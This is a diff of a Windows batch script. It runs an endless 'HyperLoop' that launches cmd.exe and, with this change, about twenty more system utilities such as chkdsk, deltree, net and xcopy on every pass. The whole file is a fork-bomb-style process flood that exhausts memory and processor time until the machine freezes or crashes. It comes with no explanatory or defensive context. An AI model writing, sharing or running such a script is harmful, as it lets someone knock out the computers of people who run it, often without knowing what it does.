@@ -1,6 +1,25 @@
 @echo off
 :HyperLoop
 start cmd.exe
-start chrome.exe
-start explorer.exe shell:RecycleBinFolder
+start robocopy.exe
+start diskcopy.com
+start edit.com
+start mode.com
+start more.com
+start sys.com
+start attrib.exe
+start chkdsk.exe
+start debug.exe
+start deltree.exe
+start fc.exe
+start find.exe
+start label.exe
+start mem.exe
+start move.exe
+start net.exe
+start nlsfunc.exe
+start sort.exe
+start subst.exe
+start xcopy.exe
+start xcopy32.exe
 goto HyperLoop
